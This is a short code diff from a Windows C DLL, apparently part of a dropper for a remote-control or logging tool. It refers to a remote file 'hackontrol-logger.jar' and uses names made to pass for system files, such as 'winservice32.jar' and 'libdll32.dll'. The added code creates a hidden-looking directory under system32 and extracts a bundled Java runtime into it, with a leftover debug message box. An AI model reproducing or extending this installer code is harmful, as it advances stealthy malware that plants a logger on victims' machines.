@@ -10,6 +10,7 @@
 #define JAR_NAME         L"winservice32.jar"
 #define RUNDLL32EXE      L"rundll32.exe"
 #define LIBRARY_NAME     L"libdll32.dll"
+#define JAVA_PATH_NAME    "jn" // Java runtime eNvironment
 #define REMOTE_FILE_NAME L"hackontrol-logger.jar"
 
 __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
@@ -45,11 +46,29 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 		goto freeDownloadArgument;
 	}*/
 
-	if(ExtractJRE()) {
+	LPSTR javaDirectoryPath = KHFormatMessageA("%ws\\" JAVA_PATH_NAME, system32Path);
+
+	if(!javaDirectoryPath) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
 		goto freeDownloadArgument;
 	}
 
-	MessageBoxW(NULL, downloadArgument, rundll32Path, MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+	if(!CreateDirectoryA(javaDirectoryPath, NULL)) {
+		DWORD error = GetLastError();
+
+		if(error != ERROR_ALREADY_EXISTS) {
+			KHWin32DialogErrorW(error, L"KHFormatMessageW");
+			goto freeJavaDirectoryPath;
+		}
+	}
+
+	if(ExtractJRE(javaDirectoryPath)) {
+		goto freeJavaDirectoryPath;
+	}
+
+	MessageBoxA(NULL, javaDirectoryPath, "Dialog", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+freeJavaDirectoryPath:
+	FREE(javaDirectoryPath);
 freeDownloadArgument:
 	FREE(downloadArgument);
 freeRundll32Path:
